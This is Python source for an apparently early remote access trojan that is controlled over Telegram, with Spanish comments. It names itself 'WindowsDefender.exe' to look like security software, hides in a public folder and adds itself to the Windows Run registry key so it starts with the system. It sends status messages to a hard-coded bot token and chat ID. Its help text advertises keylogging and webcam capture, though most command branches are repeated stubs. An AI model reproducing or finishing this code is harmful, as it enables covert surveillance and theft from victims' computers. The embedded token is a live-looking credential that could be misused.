#██████╗░░█████╗░████████╗░░██████╗░██╗░░░██╗
#██╔══██╗██╔══██╗╚══██╔══╝░░██╔══██╗╚██╗░██╔╝
#██████╔╝███████║░░░██║░░░░░██████╔╝░╚████╔╝░
#██╔══██╗██╔══██║░░░██║░░░░░██╔═══╝░░░╚██╔╝░░
#██║░░██║██║░░██║░░░██║░░░░░██║░░░░░░░░██║░░░
#╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░░░╚═╝░░░░░░░░╚═╝░░░
#░██████╗██████╗░██╗░░░██╗░████████╗███████╗██╗░░░░░███████╗░██████╗░██████╗░░█████╗░███╗░░░███╗░░░░░░
#██╔════╝██╔══██╗╚██╗░██╔╝░╚══██╔══╝██╔════╝██║░░░░░██╔════╝██╔════╝░██╔══██╗██╔══██╗████╗░████║░░░░░░
#╚█████╗░██████╔╝░╚████╔╝░░░░░██║░░░█████╗░░██║░░░░░█████╗░░██║░░██╗░██████╔╝███████║██╔████╔██║░░░░░░
#░╚═══██╗██╔═══╝░░░╚██╔╝░░░░░░██║░░░██╔══╝░░██║░░░░░██╔══╝░░██║░░╚██╗██╔══██╗██╔══██║██║╚██╔╝██║░░░░░░
#██████╔╝██║░░░░░░░░██║░░░░░░░██║░░░███████╗███████╗███████╗╚██████╔╝██║░░██║██║░░██║██║░╚═╝░██║░░░░░░
#╚═════╝░╚═╝░░░░░░░░╚═╝░░░░░░░╚═╝░░░╚══════╝╚══════╝╚══════╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝░v1.0░
import time                             # Pausar script por segundos predeterminados
from winreg import OpenKey, HKEY_LOCAL_MACHINE, KEY_ALL_ACCESS, REG_SZ, SetValueEx, HKEY_CURRENT_USER

import telepot                          # Api de Telegram
from telepot.loop import MessageLoop    # Api de Telegram


class Config:
    def __init__(self):
        self.NAME_KEY = "WindowsDefender" + ".exe"  # Nombre del Keylogger // Debe ser exactamente igual al Compilado *.exe
        self.NAME_REG = "Windows Defeder REG"  # Nombre del Keylogger en el registro
        self.PATH_HIDDEN_LOG = "C:\\Users\\Public\\Security\\Settings" + "\\"  # Ruta del Registro de teclas
        self.LOG_NAME = "reg" + "." + "k"
        self.PATH_HIDDEN_KEY = "C:\\Users\\Public\\Security\\Windows Defender" + "\\"  # Ruta donde se esconderá el KEYLOGGER
        self.PATH_KEY = self.PATH_HIDDEN_KEY + self.NAME_KEY  # <No cambiar>
        self.PATH_LOG = self.PATH_HIDDEN_LOG + self.LOG_NAME  # <No cambiar>
        self.SCREENSHOT = True  # Activar o desactivar Screenshot
        self.TIME_SCREENSHOT = 2  # Tiempo de intervalo de ScreenShot
        self.DELAY = 10  # tiempo de retraso para evitar sobrecargos al iniciar
        self.TIME_SEND = 1  # [minutos]                                               # Tiempo de envió del registro

    class Developer:
        def __init__(self):
            self.STARUP = False
            self.TROJAN = False
            self.DELAY = 1
            self.CONSOLE_DEBUG = False
    class TelegramBot:
        def __init__(self):
            self.ID = 831756903  # ID Principal [Obligatorio] [Envia comandos]
            self.ID_2 = 000000000  # ID secundario [Opcional Solo screenshot, photo, etc]
            self.ID_3 = 000000000  # ID Terciario  [Opcional Solo screenshot, photo, etc]
            self.TOKEN = "1238108150:AAGdB66CsS_5fKpgVnOXvO8w9eSrT2V5n50"  # TOKEN de tu Bot [Obligatorio]
            # Personalize
            self.LEN_TEXT = 2  # 3600  #    [Longitud maxima por mensaje es de = 4000] # Solo se enviará el registro si sobrepasa la longitud especificada

class Util:
    def __init__(self):
        pass

    def addStartUp(self):
        print("[StartUp] Iniciando Función")
        keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
        try:  # Solo si tiene permisos de administrador
            registry = OpenKey(HKEY_LOCAL_MACHINE, keyVal, 0, KEY_ALL_ACCESS)  # machine
            SetValueEx(registry, Config().NAME_REG, 0, REG_SZ, Config().PATH_KEY)
            Functions().CheckFolder_StartUP()  # Crea carpeta
            print("[StartUp] Exitoso Administrador")
        except:
            print("[StartUp] USER - Verificando existencia")
            if Functions().CheckFolder_StartUP():
                print("[StartUp] USER - No se encontró, creando...")
                registry = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)  # local
                SetValueEx(registry, Config().NAME_REG, 0, REG_SZ, Config().PATH_KEY)
                print("[StartUp] USER - EXITOSO")
class Functions:
    def __init__(self):
        pass



def handle(msg):
    command = msg['text']           # Recibe el texto que el usuario mande al bot
    ID = Config.TelegramBot().ID    # ID personal
    cache = ""
    if command == "/about":
        cache = ""\
        '\n<b>Developed by:</b> <code>SebastianEPH</code>' \
        '\n<b>Product Name: </b><a href="https://github.com/SebastianEPH/RATpySpyTelegramBot"> RATpySpyTelegramBot</a>' \
        '\n<b>Type Software:</b> <code>Remote Administration tool</code>' \
        '\n<b>Versión:</b> <code>1.0</code>' \
        '\n<b>State:</b> <code>Alfa</code>' \
        '\n<b>Architecture:</b> <code>x86 bits</code> || <code>x64 bits</code>' \
        '\n<b>Size:</b> <code>No disponible</code>' \
        '\n<b>Undetectable:</b> <code>Not tester</code>' \
        '\n<b>Plataform:</b> <code>Windows 7, 8.1 and 10</code>' \
        '\n<b>Programming Lenguage:</b> <code>Python 3.8</code>' \
        '\n<b>Licence:</b> <code>GNU Licence</code>' \
        '\n<b>IDE:</b> PyCharm <i>[Education license]</i>' \
        '\n<b>Description:</b>' \
        '\nRemote access Trojan, spies and obtains information from the infected pc, controlled by telegram commands.  \n<b>[Educational purposes]</b>' \
        '\n<b></b>' \
        '\n<b></b>' \
        '\n<b>Contact: </b>' \
        '\n<b> - <a href="https://github.com/SebastianEPH">GitHub</a> </b>' \
        '\n<b> - <a href="https://t.me/sebastianeph">Telegram</a> </b>' \
        '\n<b> - <a href="https://sebastianeph.github.io/">WebSite</a> </b>' \
        '\n<b> - SebastianEPH99@gmail.com</b>' \
        '\n<b></b>' \
        '\n<b>You can read the documentation at the following link >></b>' \
        '\n<b></b>'
        bot.sendMessage(TB.TelegramBot().ID, cache, parse_mode='html')
        bot.sendPhoto(ID,"https://i.imgur.com/SelWET0.png")
        print("[Command] /About Exitoso")
    elif command == "/screenshot":


        bot.sendMessage(ID, "Scrrenshot")
        print("[Command] /Screenshot Exitoso")
    elif command == "/screenshot":
        bot.sendMessage(ID, "Scrrenshot")
        print("[Command] /About Exitoso")
    elif command == "/screenshot":
        bot.sendMessage(ID, "Scrrenshot")
        print("[Command] /About Exitoso")
    elif command == "/screenshot":
        bot.sendMessage(ID, "Scrrenshot")
        print("[Command] /About Exitoso")
    elif command == "/screenshot":
        bot.sendMessage(ID, "Scrrenshot")
        print("[Command] /About Exitoso")
    elif command == "/screenshot":
        bot.sendMessage(ID, "Scrrenshot")
        print("[Command] /About Exitoso")
    elif command == "/screenshot":
        bot.sendMessage(ID, "Scrrenshot")
        print("[Command] /About Exitoso")
    elif command == "/screenshot":
        bot.sendMessage(ID, "Scrrenshot")
        print("[Command] /About Exitoso")
    elif command == "/screenshot":
        bot.sendMessage(ID, "Scrrenshot")
        print("[Command] /About Exitoso")
    else:
        FUNCTIONELITIES = "Write "\
        "red_info => Información de la Red\n" \
        "/webcam   => Toma foto a la WebCam\n" \
        "/webcam   => Toma foto a la WebCam\n" \
        "/webcam   => Toma foto a la WebCam\n" \
        "/webcam   => Toma foto a la WebCam\n" \
        "/keylogger_active     => Active Keylogger\n" \
        "/keylogger_disable   => Disable Keylogger\n" \
        "/keylogger_get          => Get keylog\n" \
        "/webcam   => Toma foto a la WebCam\n" \
        "/webcam   => Toma foto a la WebCam\n" \
        "/webcam   => Toma foto a la WebCam\n" \
        "/about"
        bot.sendMessage(ID, FUNCTIONELITIES)
        print("[Command] /help other")

# Starting Script
if __name__ == '__main__':
    print("[RAT] Start")

    # Instancia configuración
    TB = Config()

    # Instancia Bot con Token
    bot = telepot.Bot(TB.TelegramBot().TOKEN)
    bot.sendMessage(TB.TelegramBot().ID, "Usted está en linea ...")
    # Execute other thread what listening
    MessageLoop(bot, handle).run_as_thread()
    print('Listening ...')



    # Keep the program running.
    while True:
        time.sleep(10)


